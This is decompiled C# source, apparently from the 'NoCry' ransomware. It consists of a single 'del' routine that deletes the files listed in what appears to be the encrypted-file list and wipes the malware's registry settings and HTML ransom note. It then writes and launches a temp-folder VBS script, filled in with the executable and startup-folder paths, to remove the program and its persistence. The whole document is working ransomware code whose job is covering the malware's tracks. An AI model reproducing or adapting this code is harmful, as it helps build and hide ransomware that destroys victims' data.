using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NoCry.My.Resources;

namespace NoCry;

[StandardModule]
internal sealed class del
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void del()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		string text = default(string);
		string text2 = default(string);
		List<string>.Enumerator enumerator = default(List<string>.Enumerator);
		string current = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 665:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_002a;
						case 4:
							goto IL_0035;
						case 5:
						case 6:
							goto IL_003e;
						case 7:
							goto IL_0042;
						case 8:
							goto IL_0051;
						case 9:
							goto IL_006c;
						case 10:
							goto IL_0088;
						case 11:
							goto IL_00a4;
						case 12:
							goto IL_00c0;
						case 13:
							goto IL_00dc;
						case 14:
							goto IL_00f8;
						case 15:
							goto IL_0114;
						case 16:
							goto IL_0130;
						case 17:
							goto IL_014c;
						case 18:
							goto IL_0168;
						case 19:
							goto IL_0177;
						case 20:
						case 21:
							goto IL_0184;
						case 22:
							goto IL_018d;
						case 23:
							goto IL_01a1;
						case 24:
							goto IL_01b5;
						case 25:
							goto IL_01de;
						case 26:
							goto IL_01eb;
						case 27:
							goto IL_01f6;
						case 28:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 29:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_01eb:
					num = 26;
					streamWriter.WriteLine(text);
					goto IL_01f6;
					IL_01de:
					num = 25;
					streamWriter = new StreamWriter(text2, append: false);
					goto IL_01eb;
					IL_000a:
					num = 2;
					enumerator = Form4.listenc.GetEnumerator();
					goto IL_0018;
					IL_0018:
					if (enumerator.MoveNext())
					{
						current = enumerator.Current;
						goto IL_002a;
					}
					goto IL_0042;
					IL_01f6:
					num = 27;
					streamWriter.Close();
					break;
					IL_002a:
					num = 3;
					if (File.Exists(current))
					{
						goto IL_0035;
					}
					goto IL_003e;
					IL_0035:
					num = 4;
					File.Delete(current);
					goto IL_003e;
					IL_003e:
					num = 6;
					goto IL_0018;
					IL_0042:
					num = 7;
					((IDisposable)enumerator).Dispose();
					goto IL_0051;
					IL_0051:
					num = 8;
					Interaction.SaveSetting("P", "0", Class1.Settings.Setting, "");
					goto IL_006c;
					IL_006c:
					num = 9;
					Interaction.SaveSetting("H", "0", Class1.Settings.Setting, "");
					goto IL_0088;
					IL_0088:
					num = 10;
					Interaction.SaveSetting("M", "0", Class1.Settings.Setting, "");
					goto IL_00a4;
					IL_00a4:
					num = 11;
					Interaction.SaveSetting("S", "0", Class1.Settings.Setting, "");
					goto IL_00c0;
					IL_00c0:
					num = 12;
					Interaction.SaveSetting("X", "0", Class1.Settings.Setting, "");
					goto IL_00dc;
					IL_00dc:
					num = 13;
					Interaction.SaveSetting("D", "0", Class1.Settings.Setting, "");
					goto IL_00f8;
					IL_00f8:
					num = 14;
					Interaction.SaveSetting("T", "0", Class1.Settings.Setting, "");
					goto IL_0114;
					IL_0114:
					num = 15;
					Interaction.SaveSetting("G", "0", Class1.Settings.Setting, "");
					goto IL_0130;
					IL_0130:
					num = 16;
					Interaction.SaveSetting("F", "0", Class1.Settings.Setting, "");
					goto IL_014c;
					IL_014c:
					num = 17;
					Interaction.SaveSetting("C", "0", Class1.Settings.Setting, "");
					goto IL_0168;
					IL_0168:
					num = 18;
					if (File.Exists(Class1.Settings.html))
					{
						goto IL_0177;
					}
					goto IL_0184;
					IL_0177:
					num = 19;
					File.Delete(Class1.Settings.html);
					goto IL_0184;
					IL_0184:
					num = 21;
					text = Resources.del;
					goto IL_018d;
					IL_018d:
					num = 22;
					text2 = Path.GetTempPath() + "del.vbs";
					goto IL_01a1;
					IL_01a1:
					num = 23;
					text = text.Replace("%path%", Application.get_ExecutablePath());
					goto IL_01b5;
					IL_01b5:
					num = 24;
					text = text.Replace("%startup%", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Class1.Settings.mute + ".exe");
					goto IL_01de;
					end_IL_0001_2:
					break;
				}
				num = 28;
				Process.Start(text2);
				ProjectData.EndApp();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 665;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
